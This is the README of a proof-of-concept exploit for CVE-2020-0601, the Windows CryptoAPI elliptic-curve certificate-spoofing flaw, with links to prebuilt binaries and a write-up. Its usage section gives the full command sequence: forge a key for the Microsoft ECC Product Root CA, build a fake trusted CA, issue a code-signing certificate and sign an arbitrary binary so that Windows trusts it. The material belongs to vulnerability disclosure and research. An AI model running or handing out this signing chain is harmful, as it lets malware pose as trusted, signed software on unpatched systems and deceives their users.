# Curveball
A PoC for [CVE-2020-0601](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0601). A detailed blog post can be found [here](http://web.archive.org/web/20200224210145/https://blog.layle.io/uncovering-cve-2020-0601/). This exploit allows you to create a fake trusted certificate by abusing how CryptoAPI handles certain parameters on ECC based certificates.

## Setup
Clone the repository and open it in Visual Studio 2019. Switch to Release and compile it. You can find prebuilt binaries [here](https://github.com/ioncodes/Curveball/releases).

## Usage
```bash
.\Curveball.exe MicrosoftECCProductRootCertificateAuthority.cer MicrosoftECCProductRootCertificateAuthority_fake.key
# in linux bash (you can also use Windows but you'd have to get an alternative for osslsigncode). WSL on Windows works fine.
openssl req -new -x509 -key MicrosoftECCProductRootCertificateAuthority_fake.key -out trusted_ca.crt
openssl ecparam -name secp384r1 -genkey -noout -out cert.key
openssl req -new -key cert.key -out cert.csr -config openssl.conf -reqexts v3_cs
openssl x509 -req -in cert.csr -CA trusted_ca.crt -CAkey MicrosoftECCProductRootCertificateAuthority_fake.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl.conf -extensions v3_cs
openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile trusted_ca.crt -name "Code Signing" -out cert.p12
./osslsigncode sign -pkcs12 cert.p12 -n "Signed by Layle" -in <BINARY_TO_SIGN> -out <SIGNED_BINARY>
```

## Result
Note that the 7zip installer is usually not signed!

![trusted](https://github.com/ioncodes/Curveball/blob/master/images/trusted.png?raw=true)
